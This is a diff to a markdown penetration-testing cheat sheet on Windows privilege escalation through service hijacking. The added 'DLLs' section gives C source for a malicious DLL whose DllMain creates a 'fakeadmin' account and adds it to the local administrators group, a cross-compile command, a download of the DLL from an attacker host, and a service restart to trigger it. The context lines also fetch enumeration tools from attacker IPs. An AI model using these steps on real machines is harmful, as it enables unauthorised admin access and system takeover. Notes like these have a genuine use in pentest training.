@@ -129,7 +129,7 @@ PS> iwr http://IpAttacker/Seatbelt.exe -OutFile Seatbelt.exe
 PS> .\Seatbelt.exe -group=all
 ```
 
-## Services
+## Services Hijacking
 
 List services (warning, needs an RDP connection for non-admin users. A bind shell or WinRM connection won't do):
 ```
@@ -137,12 +137,12 @@ Get-CimInstance -ClassName win32_service | Select Name, StartMode, State, PathNa
 ```
 Check the rights to overwrite user installed binaries:
 ```
-PS> Get_ACL "c:\path\to\user\installed\binary\service.exe"
+PS> Get_ACL "c:\path\to\user\installed\binary\service.exe" | Format-List
 cmd> icacls "c:\path\to\user\installed\binary\service.exe"
 ```
 Permission mask: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls
 
-### Hijacking
+### Binary
 
 #### Manual hijacking: `useradd.c` code
 
@@ -195,6 +195,62 @@ PS> iwr -uri http://$AttackerIP/PowerUp.ps1 -Outfile PowerUp.ps1
 PS> powershell -ep bypass
 PS> . .\PowerUp.ps1
 PS> Get-ModifiableServiceFile
+```
+
+### DLLs
+
+Same as binary hijacking:
+```
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+icacls .\path\to\custom_service.exe
+```
+then use [ProcMon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) to check DLL calls by a service: `Filter menu > Filter > Process name / is / Value / Include`
+```
+Restart-Service some_custom_service
+```
+A missing DLL is searched in [specific order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order), which can allow to hijack the call with a [boiler plate](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library#the-dll-entry-point):
+```
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user fakeadmin fakepass123! /add");
+  	    i = system ("net localgroup administrators fakeadmin /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+Cross-compile it: 
+```
+x86_64-w64-mingw32-gcc hijackedDLL.cpp --shared -o missingDLL.dll
+```
+Upload it in an available path according to the search order:
+```
+iwr -uri http://$AttackerIp/missingDLL.dll -outfile missingDLL.dll
+```
+and restart the service:
+```
+Restart-Service custom_service
+```
+The `fakeadmin` user should be created:
+```
+net user
+net localgroup administrators
 ```
 
 ### Unquoted service path
